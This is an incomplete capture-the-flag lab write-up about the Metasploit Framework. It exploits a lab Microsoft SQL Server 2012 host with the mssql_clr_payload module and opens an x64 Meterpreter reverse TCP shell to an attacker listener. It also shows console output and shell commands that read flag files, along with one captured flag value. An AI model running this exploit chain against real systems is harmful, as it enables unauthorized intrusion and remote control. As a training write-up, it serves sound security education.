#  Host & Network Penetration Testing: The Metasploit Framework CTF 1.


## Objective
Use Metasploit and manual investigation techniques to capture the flags

## Skills Learned
- Use Metasploit as the main tool to get the flags

## Tools Used

- MetasploitÍ

## Flags to Capture:
- Flag 1: Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag.
- Flag 2: Locate the second flag within the Windows configuration folder.
- Flag 3: The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag.
- Flag 4: Investigate the Administrator directory to find the fourth flag.

### Detailed Steps
  <img width="1920" height="972" alt="Screenshot 2026-03-01 at 7 43 26 PM" src="https://github.com/user-attachments/assets/89a66586-f6af-420b-90cc-899be98e5596" />

#### Flag 1

First open nmap and run the PostgreSQL service wuth the command `service postgresql start && msfconsole` And run the nmap scan to detect the services and the Operating system of the target


<img width="1012" height="547" alt="Screenshot 2026-03-01 at 8 59 07 PM" src="https://github.com/user-attachments/assets/0173a13e-42f4-44eb-8c9f-c9f0a68fffc4" />

We can identify the por 1433 is open and running  Microsoft SQL Server 2012 11.00.6020. Now we proceed to search the exploit. `search type:exploit  sql 2012  platform:windows` 

<img width="1497" height="324" alt="Screenshot 2026-03-01 at 9 01 30 PM" src="https://github.com/user-attachments/assets/99931c5b-9590-4f23-aa33-43e8aed5de38" />

Let's choose `exploit/windows/mssql/mssql_clr_payload` and `show the options` in order to check the parameters we need to set `set RHOSTS target.ine.local` if we hit run, we ill get the following error

```
msf6 exploit(windows/mssql/mssql_clr_payload) > run

[*] Started reverse TCP handler on 10.10.48.2:4444 
[!] 10.3.26.89:1433 - Setting EXITFUNC to 'thread' so we don't kill SQL Server
[-] 10.3.26.89:1433 - Exploit aborted due to failure: bad-config: Target SQL server arch is x64, payload architecture is x86
[*] Exploit completed, but no session was created.
```

Therefore we need to change the payload to x64 `set payload windows/x64/meterpreter/reverse_tcp` then we run it and obtaine a meterpreter session:

<img width="809" height="308" alt="Screenshot 2026-03-01 at 9 29 40 PM" src="https://github.com/user-attachments/assets/0960edd1-15c1-4303-8572-fda475d42f46" />

Once we have the session let's go to the C:\ directory and get the first flag 

```
shell
cd /
dir
type flag1.txt
```
<img width="573" height="320" alt="Screenshot 2026-03-01 at 9 32 51 PM" src="https://github.com/user-attachments/assets/0faadb9e-4433-458e-8314-0e77c560670d" />


#### Flag 2

Let's move to the Wndows folder, and look for the config directory. C:\Windows\System32\config 

<img width="554" height="60" alt="Screenshot 2026-03-01 at 9 49 44 PM" src="https://github.com/user-attachments/assets/3d653468-ef9c-4503-8d1c-40f89af31226" />


#### Flag 3

#### Flag 4


### Final Flags

- Flag 1: 88093e456fa14d81a74c04e91a4bc832
- Flag 2: 
- Flag 3: 
- Flag 4: 
- Flag 5: 
- Flag 6: 
